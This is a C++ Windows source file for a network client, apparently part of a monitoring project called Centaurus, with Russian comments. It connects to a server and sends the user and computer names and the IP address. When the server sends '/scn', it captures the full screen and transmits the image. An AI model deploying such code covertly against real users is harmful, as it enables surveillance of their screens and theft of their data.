#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Client.h"
#include <iostream>
#include <windows.h>
#include <Lmcons.h>
#include <sstream>
#include <thread>

#include "Constants.h"

#pragma comment(lib, "ws2_32.lib")

Client::Client(const char* serverIP_, u_short port_) : m_serverIP(serverIP_), m_port(port_) {
    WSADATA wsData;
    WORD DLLVersion = MAKEWORD(2, 1);
    if (WSAStartup(DLLVersion, &wsData) != 0)
    {
        std::cerr << "Error initializing Winsock" << std::endl;
        stop();
    }

    m_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (m_socket == INVALID_SOCKET)
    {
        std::cerr << "Can't create a socket! Quitting" << std::endl;
        stop();
    }

    SOCKADDR_IN addr;
    addr.sin_addr.s_addr = inet_addr(serverIP_);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port_);

    int connResult = connect(m_socket, (sockaddr*)&addr, sizeof(addr));
    if (connResult == SOCKET_ERROR)
    {
        std::cerr << "Can't connect to server! Quitting" << std::endl;
        stop();
    }
}

Client::~Client() {
    closesocket(m_socket);
    WSACleanup();
}

/**
 * Начало сеанса.
 */
void Client::start() {
    sendClientInfo();
    std::thread commandThread(&Client::listenForCommands, this);
    commandThread.join();
}

/**
 * Завершение сеанса.
 */
void Client::stop() const {
    closesocket(m_socket);
    WSACleanup();
}

/**
 * Получить IPv4 адрес.
 * @return Строка с IPv4 адресом текущего клиента, в случае успеха.
 */
std::string getLocalIPv4() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0)
    {
        std::cerr << "gethostname failed" << std::endl;
        return "";
    }

    hostent* host = gethostbyname(hostname);
    if (host == nullptr)
    {
        std::cerr << "gethostbyname failed" << std::endl;
        return "";
    }

    for (char** addr = host->h_addr_list; *addr != nullptr; ++addr)
    {
        struct in_addr* ipv4 = reinterpret_cast<struct in_addr*>(*addr);
        if (ipv4)
        {
            return inet_ntoa(*ipv4);
        }
    }

    return "";
}

/**
 * Отправить основную информацию о текущем клиенте.
 */
void Client::sendClientInfo() const
{
    // Время подключения
    auto now = std::chrono::system_clock::now();
    std::time_t currentTime = std::chrono::system_clock::to_time_t(now);
    std::stringstream timeStream;
    timeStream << std::put_time(std::localtime(&currentTime), "%d-%m-%Y %H:%M:%S");

    // Имя пользователя
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserNameA(username, &username_len);

    // Имя компьютера
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerName_len = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameA(computerName, &computerName_len);

    // IP-адрес
    std::string ipAddress = getLocalIPv4(); // Используем IP-адрес сервера для упрощения

    // Собираем информацию в строку
    std::stringstream infoStream;
    infoStream << timeStream.str() << " | ";
    infoStream << "User: " << username << " | ";
    infoStream << "PC Name: " << computerName << " | ";
    infoStream << "IP Address: " << ipAddress;

    // Отправляем информацию на сервер
    std::string clientInfo = infoStream.str();
    int sendResult = send(m_socket, clientInfo.c_str(), clientInfo.size() + 1, 0);
    if (sendResult == SOCKET_ERROR)
    {
        std::cerr << "Failed to send client info, error: " << WSAGetLastError() << std::endl;
    }
}

/**
 * Обработка снимка экрана и запись в файл (*bmp).
 * @param wPath Путь к файлу.
 */
void Client::captureScreenshot(const std::string& wPath) {
    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    HGDIOBJ hTempBitmap;
    HBITMAP hBitmap;
    BITMAP bAllDesktops;
    HDC hDC, hMemDC;
    LONG lWidth, lHeight;
    BYTE *bBits = NULL;
    HANDLE hHeap = GetProcessHeap();
    DWORD cbBits, dwWritten = 0;
    HANDLE hFile;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));

    hDC = GetDC(NULL);
    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

    lWidth = bAllDesktops.bmWidth;
    lHeight = bAllDesktops.bmHeight;

    DeleteObject(hTempBitmap);

    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biPlanes = 1;
    biHeader.biWidth = lWidth;
    biHeader.biHeight = lHeight;

    bInfo.bmiHeader = biHeader;

    cbBits = (((24 * lWidth + 31)&~31) / 8) * lHeight;

    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID **)&bBits, NULL, 0);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);

    
    hFile = CreateFileA(wPath.c_str(), GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(INVALID_HANDLE_VALUE == hFile)
    {
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hDC);
        DeleteObject(hBitmap);

        return;
    }
    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);
    FlushFileBuffers(hFile);
    CloseHandle(hFile);

    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);
}

/**
 * Обработка и отправка на сервер снимка экрана.
 */
void Client::sendScreenshot(SOCKET sock) {
    const std::string screenshotFile = "screenshot.bmp";
    const std::string screenPath = (Centaurus::contentPath / screenshotFile).string();
    captureScreenshot(screenPath);

    FILE* file;
    errno_t err = fopen_s(&file, screenPath.c_str(), "rb");
    if (err != 0)
    {
        std::cerr << "Error opening file for reading" << std::endl;
        return;
    }

    char buffer[4096];
    while (!feof(file))
    {
        int bytesRead = fread(buffer, 1, sizeof(buffer), file);
        if (bytesRead > 0)
        {
            int sendResult = send(sock, buffer, bytesRead, 0);
            if (sendResult == SOCKET_ERROR)
            {
                std::cerr << "Failed to send screenshot data, error: " << WSAGetLastError() << std::endl;
                break;
            }
        }
    }

    fclose(file);
}

/**
 * Обработка ответа сервера.
 */
void Client::listenForCommands() const
{
    char buf[4096];
    while (true)
    {
        ZeroMemory(buf, 4096);
        int bytesReceived = recv(m_socket, buf, 4096, 0);
        if (bytesReceived != SOCKET_ERROR)
        {
            std::string command(buf, 0, bytesReceived);
            if (command == "/scn")
            {
                std::cout << "Received screenshot command" << std::endl;
                sendScreenshot(m_socket);
            }
            else if (command == "/exit")
            {
                std::cout << "Server is shutting down" << std::endl;
            }
        }
    }
}
